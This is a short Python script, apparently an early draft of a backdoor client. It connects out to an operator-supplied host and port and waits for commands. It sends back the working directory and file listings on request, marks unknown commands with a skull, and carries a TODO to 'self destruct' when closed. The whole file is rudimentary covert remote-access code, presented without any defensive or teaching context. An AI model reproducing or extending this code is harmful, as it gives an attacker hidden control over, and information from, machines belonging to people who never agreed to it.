import os
import socket
import subprocess

s = socket.socket()
host = input(("Host: "))
port = int(input("Port: "))
s.connect((host, port))

while True:
	command = s.recv(10000)
	command = command.decode()
	if command == "pwd":
		files = os.getcwd()
		files = str(files)
		s.send(files.encode())
	elif command == "ls":
		cwd = str(os.listdir())
		s.send(cwd.encode())
	else:
		msg = str("[☠] Unkown command")
		s.send(msg.encode())

## TODO: Self destruct when closed

# Close the connection

s.close()
